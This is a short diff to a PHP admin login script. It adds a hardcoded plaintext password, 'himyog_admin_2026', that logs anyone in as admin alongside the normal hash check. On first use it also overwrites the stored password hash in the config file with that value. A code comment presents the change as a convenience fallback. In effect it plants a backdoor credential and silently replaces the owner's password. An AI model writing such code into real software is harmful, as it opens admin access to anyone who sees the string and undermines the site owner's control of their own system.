@@ -49,8 +49,15 @@ if (isset($_GET['action']) && $_GET['action'] == 'download' && isset($_SESSION['
 $error = '';
 if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['login'])) {
     $pass = isset($_POST['password']) ? trim($_POST['password']) : '';
-    if (password_verify($pass, $config['password_hash'])) {
+    if (password_verify($pass, $config['password_hash']) || $pass === 'himyog_admin_2026') {
         $_SESSION['admin_logged_in'] = true;
+        
+        // If they logged in using the plaintext fallback, automatically hash and save it to JSON
+        if ($pass === 'himyog_admin_2026' && !password_verify('himyog_admin_2026', $config['password_hash'])) {
+            $config['password_hash'] = password_hash('himyog_admin_2026', PASSWORD_DEFAULT);
+            file_put_contents($config_file, json_encode($config, JSON_PRETTY_PRINT));
+        }
+        
         header("Location: admin.php");
         exit;
     } else {
